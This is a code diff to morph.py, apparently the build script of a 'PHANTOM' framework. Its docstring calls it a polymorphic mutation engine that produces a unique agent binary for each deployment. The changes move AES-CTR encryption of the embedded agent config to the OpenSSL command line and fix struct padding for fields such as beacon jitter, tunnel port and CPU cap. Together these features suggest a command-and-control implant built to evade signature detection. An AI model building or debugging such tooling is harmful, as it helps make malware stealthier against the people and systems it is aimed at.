@@ -4,9 +4,8 @@ morph.py — Polymorphic Mutation Engine for PHANTOM Framework
 Generates a cryptographically unique agent binary for each deployment.
 """
 
-import os, sys, re, json, random, string, struct, hashlib, subprocess, tempfile, shutil
+import os, sys, re, json, random, string, struct, hashlib, subprocess, tempfile, shutil, binascii
 from pathlib import Path
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 PHANTOM_SRC  = Path("phantom.c")
 CC           = os.environ.get("CC", "musl-gcc")
@@ -67,9 +66,24 @@ class MutationEngine:
         self.symbol_map = {}
 
     def _aes_ctr_encrypt(self, plaintext: bytes) -> bytes:
-        cipher = Cipher(algorithms.AES(self.build_key), modes.CTR(self.build_iv))
-        enc = cipher.encryptor()
-        return enc.update(plaintext) + enc.finalize()
+        # Use OpenSSL CLI to avoid python dependencies
+        key_hex = binascii.hexlify(self.build_key).decode()
+        iv_hex  = binascii.hexlify(self.build_iv).decode()
+
+        cmd = [
+            'openssl', 'enc', '-aes-256-ctr',
+            '-K', key_hex,
+            '-iv', iv_hex,
+            '-e', '-nopad'
+        ]
+
+        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        out, err = proc.communicate(input=plaintext)
+
+        if proc.returncode != 0:
+            raise RuntimeError(f"OpenSSL encryption failed: {err.decode()}")
+
+        return out
 
     def _serialize_config(self) -> bytes:
         """Pack config struct matching exact C memory layout with alignment.
@@ -107,8 +121,9 @@ class MutationEngine:
         buf += struct.pack('<f', c['beacon_jitter'])
         buf += struct.pack('<H', c['tunnel_port'])
         buf += struct.pack('<B', c['max_cpu_pct'])
-        buf += b'\x00' * 1   # alignment padding before char[]
+        # buf += b'\x00' * 1   # Removed: char alignment is 1, no padding needed here
         buf += b'\x00' * 1024  # self_path (populated at runtime)
+        buf += b'\x00' * 1     # Add padding at the end to match sizeof(struct) alignment
         return buf
 
     def _bytes_to_c_array(self, data: bytes) -> str:
